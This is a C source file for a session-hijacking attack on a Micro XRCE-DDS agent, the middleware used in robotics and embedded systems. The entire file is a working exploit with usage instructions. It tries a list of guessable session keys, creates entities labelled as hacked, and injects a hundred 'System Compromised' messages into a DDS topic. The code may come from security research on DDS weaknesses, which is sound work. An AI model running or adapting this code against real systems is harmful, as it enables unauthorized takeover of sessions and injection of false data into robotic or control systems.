// Compile: gcc attack_session_hijack.c -o session_hijack -lmicroxrcedds_client -lmicrocdr
#include <uxr/client/client.h>
#include <ucdr/microcdr.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define STREAM_HISTORY  8
#define BUFFER_SIZE     UXR_CONFIG_UDP_TRANSPORT_MTU * STREAM_HISTORY

typedef struct HelloWorld {
    uint32_t index;
    char message[128];
} HelloWorld;

uint32_t common_keys[] = {
    0xAAAABBBB,
    0xCCCCDDDD,
    0x11111111,
    0x22222222,
    0xDEADBEEF,
    0xCAFEBABE,
    0x12345678
};

bool serialize_HelloWorld(ucdrBuffer* writer, const HelloWorld* topic) {
    ucdr_serialize_uint32_t(writer, topic->index);
    ucdr_serialize_string(writer, topic->message);
    return !writer->error;
}

void hijack_session_and_inject(char* ip, char* port, uint32_t target_key) {
    printf("[*] Attempting to hijack session with key: 0x%08X\n", target_key);
    
    uxrUDPTransport transport;
    if (!uxr_init_udp_transport(&transport, UXR_IPv4, ip, port)) {
        printf("[-] Failed to init transport\n");
        return;
    }
    
    uxrSession session;
    uxr_init_session(&session, &transport.comm, target_key);
    
    if (!uxr_create_session(&session)) {
        printf("[-] Failed to create hijacked session\n");
        uxr_close_udp_transport(&transport);
        return;
    }
    
    printf("[+] Successfully hijacked session!\n");
    
    uint8_t output_buffer[BUFFER_SIZE];
    uxrStreamId reliable_out = uxr_create_output_reliable_stream(&session, output_buffer, 
                                                                  BUFFER_SIZE, STREAM_HISTORY);
    
    uint8_t input_buffer[BUFFER_SIZE];
    uxr_create_input_reliable_stream(&session, input_buffer, BUFFER_SIZE, STREAM_HISTORY);
    
    // Create entities
    uxrObjectId participant_id = uxr_object_id(0x01, UXR_PARTICIPANT_ID);
    const char* participant_xml = "<dds>"
            "<participant>"
            "<rtps>"
            "<name>HACKED_PARTICIPANT</name>"
            "</rtps>"
            "</participant>"
            "</dds>";
    
    uint16_t req1 = uxr_buffer_create_participant_xml(&session, reliable_out, participant_id, 0, 
                                      participant_xml, UXR_REPLACE);
    
    uxrObjectId topic_id = uxr_object_id(0x01, UXR_TOPIC_ID);
    const char* topic_xml = "<dds>"
            "<topic>"
            "<name>HelloWorldTopic</name>"
            "<dataType>HelloWorld</dataType>"
            "</topic>"
            "</dds>";
    
    uint16_t req2 = uxr_buffer_create_topic_xml(&session, reliable_out, topic_id, participant_id, 
                                topic_xml, UXR_REPLACE);
    
    uxrObjectId publisher_id = uxr_object_id(0x01, UXR_PUBLISHER_ID);
    const char* publisher_xml = "";
    uint16_t req3 = uxr_buffer_create_publisher_xml(&session, reliable_out, publisher_id, participant_id, 
                                    publisher_xml, UXR_REPLACE);
    
    uxrObjectId datawriter_id = uxr_object_id(0x01, UXR_DATAWRITER_ID);
    uxrQoS_t qos = {
        .durability = UXR_DURABILITY_TRANSIENT_LOCAL,
        .reliability = UXR_RELIABILITY_RELIABLE,
        .history = UXR_HISTORY_KEEP_LAST,
        .depth = 10
    };
    
    const char* datawriter_xml = "<dds>"
            "<data_writer>"
            "<topic>"
            "<kind>NO_KEY</kind>"
            "<name>HelloWorldTopic</name>"
            "<dataType>HelloWorld</dataType>"
            "</topic>"
            "</data_writer>"
            "</dds>";
    uint16_t req4 = uxr_buffer_create_datawriter_xml(&session, reliable_out, datawriter_id, 
                                     publisher_id, datawriter_xml, UXR_REPLACE);
    
    printf("[*] Waiting for entity creation...\n");
    uint8_t status[4];
    uint16_t requests[] = {req1, req2, req3, req4};
    if (!uxr_run_session_until_all_status(&session, 2000, requests, status, 4)) {
        printf("[-] Entity creation timeout (may still work)\n");
    } else {
        printf("[+] All entities created\n");
    }
    
    printf("[*] Injecting malicious messages...\n");
    
    for (int i = 0; i < 100; i++) {
        HelloWorld topic_data;
        topic_data.index = i;
        snprintf(topic_data.message, sizeof(topic_data.message), 
                "INJECTED_MESSAGE_%d: System Compromised", i);
        
        ucdrBuffer mb;
        uint32_t topic_size = 4 + strlen(topic_data.message) + 5;
        
        uxr_prepare_output_stream(&session, reliable_out, datawriter_id, &mb, topic_size);
        serialize_HelloWorld(&mb, &topic_data);
        
        printf("[+] Injected message %d\n", i);
        
        if (i % 10 == 0) {
            uxr_run_session_time(&session, 100);
        }
        
        usleep(100000);
    }
    
    printf("[*] Keeping hijacked session alive for 30 seconds...\n");
    uxr_run_session_time(&session, 30000);
    
    uxr_delete_session(&session);
    uxr_close_udp_transport(&transport);
    printf("[*] Attack completed\n");
}

int main(int argc, char** argv) {
    if (argc != 3) {
        printf("Usage: %s <agent_ip> <agent_port>\n", argv[0]);
        printf("Example: %s 127.0.0.1 2018\n", argv[0]);
        return 1;
    }
    
    char* ip = argv[1];
    char* port = argv[2];
    
    printf("=== Session Hijacking Attack ===\n");
    printf("Target: %s:%s\n\n", ip, port);
    
    for (size_t i = 0; i < sizeof(common_keys)/sizeof(common_keys[0]); i++) {
        hijack_session_and_inject(ip, port, common_keys[i]);
        sleep(2);
    }
    
    return 0;
}
